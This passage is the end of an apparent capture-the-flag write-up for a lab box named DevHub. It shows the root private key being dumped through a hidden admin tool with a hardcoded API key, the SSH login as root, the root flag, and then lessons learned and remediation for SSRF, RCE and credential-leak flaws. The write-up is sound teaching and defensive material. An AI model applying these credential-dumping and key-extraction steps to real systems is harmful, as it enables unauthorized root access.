{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.2 Extract the Key into a Usable File

We have root's private key — but it's wrapped in JSON with literal \n escape sequences, so we need to extract and unescape it properly into a usable key file.

**Commands:**

```bash
curl -s http://localhost:15000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
| python3 -c "import json,sys; print(json.load(sys.stdin)['root_private_key'])" \
> /tmp/root_id_rsa

chmod 600 /tmp/root_id_rsa
```

**Breakdown:**

- `curl -s http://localhost:15000/tools/call ... -d '{...}'`
	- Description: Same command you just ran — re-running it to pipe the output instead of just printing it.
	- Purpose: Generates the JSON response again so we can process it.
- `| python3 -c "import json,sys; print(json.load(sys.stdin)['root_private_key'])"`
	- Description: A Python one-liner that reads JSON from stdin (json.load(sys.stdin)), extracts the value of the root_private_key field, and prints it.
	- Purpose: This is the critical step. The raw curl output is a JSON string containing literal \n characters (two characters: backslash + n) — not actual newlines. If you tried to save the raw curl output directly to a file, SSH would reject it as "invalid format" because the key needs real newline characters, not escaped ones. json.load() parses the JSON properly and converts \n escape sequences into actual newline characters automatically — that's just how JSON string parsing works. print() then outputs the key with real newlines, one per line, exactly as id_rsa files are formatted.
- `> /tmp/root_id_rsa`
	- Description: Redirects the Python output into a new file.
	- Purpose: Creates the private key file we'll use with ssh -i.
- `chmod 600 /tmp/root_id_rsa`
	- Description: Sets permissions to owner read/write only.
	- Purpose: SSH refuses to use private key files that are readable by group/others — same reasoning as the authorized_keys permissions earlier, but this time on the client side (your Kali machine).

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ curl -s http://localhost:15000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
| python3 -c "import json,sys; print(json.load(sys.stdin)['root_private_key'])" \
> /tmp/root_id_rsa

┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ chmod 600 /tmp/root_id_rsa

┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ head -3 /tmp/root_id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9

┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ tail -3 /tmp/root_id_rsa
lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
-----END OPENSSH PRIVATE KEY-----
```

The key file is now correctly formatted — proper headers, footers, and multi-line base64 content. Permissions are set to 600.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.3 SSH as Root

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ ssh -i /tmp/root_id_rsa -o StrictHostKeyChecking=no root@TARGET_IP
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Jun 10 12:50:13 PM UTC 2026

  System load:           0.0
  Usage of /:            76.6% of 9.50GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             235
  Users logged in:       1
  IPv4 address for eth0: TARGET_IP
  IPv6 address for eth0: dead:beef::a0de:adff:fee0:5010

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jun 10 12:50:15 2026 from 10.10.14.85
root@devhub:~# cat root.txt 
7418a44bc58001359c3601056dc530fe
root@devhub:~# 
```

**ROOT FLAG:** `7418a44bc58001359c3601056dc530fe`
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned

1. **JS bundle analysis is an underutilized technique.** Single-page applications ship their entire client-side routing logic in a bundled JavaScript file. Grepping that bundle for quoted path strings reveals API endpoints that never appear in visible UI elements — including dangerous backend routes like `/api/mcp/connect` that would be missed by directory fuzzing alone.

2. **OAuth proxy patterns are high-value SSRF candidates.** Any endpoint that forwards HTTP requests to an external URL for "OAuth flow" support can be weaponized for internal network scanning when the target URL is user-controlled and no allowlist is enforced. Treat these patterns as SSRF by default in code review and penetration testing.

3. **Process arguments are a common credential leak surface.** Tokens, passwords, and API keys passed as CLI arguments are visible to all local users via `ps aux` and `/proc/*/cmdline`. Applications should read secrets from environment variables or files with restricted permissions — never command-line flags. This is particularly critical for long-running services.

4. **Security-by-obscurity fails against users with read access to source.** Hiding a tool from the published API list (`/tools/list`) provides zero protection when the full source code is readable by a lateral-movement target. True authorization requires access control at the execution layer, not just discovery suppression.

5. **Running internal tooling as root is unnecessary and dangerous.** OPSMCP needed no root privileges to serve its visible tools (system status, disk check, log viewing). The decision to run it as root meant that its hidden credential dump tool — an obvious backdoor pattern — could read any file on the system. Principle of least privilege would have limited the blast radius to a dedicated low-privilege service account.

6. **SSH port forwarding is a powerful post-exploitation pivot.** Once SSH access is obtained, a single command creates authenticated tunnels to any internally-bound service. Defenders should monitor for unexpected SSH tunnel usage and implement `AllowTcpForwarding no` in `sshd_config` where tunneling is not operationally required.

7. **Audit tool registration before deploying MCP infrastructure.** The MCP Inspector's stdio transport accepts any command without validation. Production MCP deployments must implement an allowlist of trusted server commands, enforce authentication on the connect endpoint, and never expose the Inspector interface publicly.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations

### 7.1 MCPJam Inspector — Unauthenticated stdio RCE (`/api/mcp/connect`)

**What it is:** The `/api/mcp/connect` endpoint accepts a `serverConfig` object with an arbitrary `command` and `args` array and passes them directly to `child_process.spawn()` without authentication or command validation.

**Why it is dangerous:** Any unauthenticated user on the network can spawn arbitrary OS processes as the service user, achieving remote code execution with a single HTTP request. This is a complete host compromise primitive.

**Remediation:**
- Require authentication (at minimum, a shared token) on all API endpoints of the MCPJam Inspector.
- Implement a strict command allowlist — only permit pre-configured MCP server binary paths, not arbitrary commands.
- Bind the Inspector to `127.0.0.1` rather than `0.0.0.0` if external access is not required. Use SSH tunneling or a VPN for legitimate developer access.

### 7.2 MCPJam Inspector — SSRF via `/api/mcp/oauth/proxy`

**What it is:** The OAuth proxy endpoint forwards HTTP requests to any URL provided in the request body, including `http://127.0.0.1/*` addresses that represent internal services inaccessible from the external network.

**Why it is dangerous:** Attackers can enumerate and interact with all internally-bound services — including unauthenticated administrative APIs, metadata services, and databases — using the Inspector server as a relay.

**Remediation:**
- Implement a strict allowlist of permitted target domains/IPs for the proxy endpoint (e.g., only allow `accounts.google.com`, `login.microsoftonline.com`).
- Block requests to RFC 1918 addresses (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), loopback (`127.0.0.0/8`), and link-local addresses.
- Require authentication on the proxy endpoint — it should only be callable by authenticated users.

### 7.3 Jupyter — Token Exposed in Process Arguments

**What it is:** Jupyter Lab is launched with `--ServerApp.token=<value>` on the command line, making the token visible to all local users via `ps aux` and `/proc/<pid>/cmdline`.

**Why it is dangerous:** Any local user (such as the `mcp-dev` service account obtained via RCE) can read the Jupyter token and use it to execute arbitrary Python code as the `analyst` user, accessing their files and escalating privileges.

**Remediation:**
- Configure Jupyter to read the token from an environment variable (`JUPYTER_TOKEN`) or a configuration file with restricted permissions (`0600`, owned by `analyst`).
- Never pass secrets as command-line arguments. Use `jupyter_server_config.py` in a restricted directory to set `ServerApp.token`.
- Consider disabling token authentication in favor of password hashing if the service is accessible only via localhost, and ensure the hashed password is not stored in world-readable config files.

### 7.4 OPSMCP — Hardcoded API Key and Hidden Credential Dump Tool

**What it is:** OPSMCP embeds its API key in plaintext in the source code and contains a hidden tool `ops._admin_dump` that reads `/root/.ssh/id_rsa` and returns the content in an API response.

**Why it is dangerous:** The source code is readable by the `analyst` user, so the API key can be extracted and used to call the hidden tool, which runs as root and has unconstrained filesystem read access. This constitutes a complete privilege escalation path to root.

**Remediation:**
- Remove the `ops._admin_dump` tool entirely. Emergency credential recovery should use out-of-band mechanisms (physical console, IPMI, recovery boot) — never an HTTP API.
- Store the API key in an environment variable or secrets manager, not in source code.
- Run OPSMCP as a dedicated non-root service account with only the permissions needed for its visible tools.
- Implement audit logging for all tool calls, especially any that access sensitive resources.
- Restrict read access to `/opt/opsmcp/server.py` to root only (`chmod 700 /opt/opsmcp`, `chown root:root /opt/opsmcp/server.py`).

### 7.5 OPSMCP — Running as Root Without Necessity

**What it is:** The OPSMCP process (PID 1061) runs as root (`uid=0`), despite providing only read-only monitoring functionality.

**Why it is dangerous:** Root-owned processes have unrestricted filesystem access. Any vulnerability in the service — including the hidden admin tool — can directly read, modify, or delete any file on the system.

**Remediation:**
- Create a dedicated `opsmcp` service account with only the minimum permissions required for the visible tools (read access to `/proc` for system stats, controlled access to log files via group membership).
- Use `systemd` unit files with `User=opsmcp`, `CapabilityBoundingSet=`, and `NoNewPrivileges=true` to enforce the least-privilege execution context.
- Audit all other services for unnecessary root execution.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

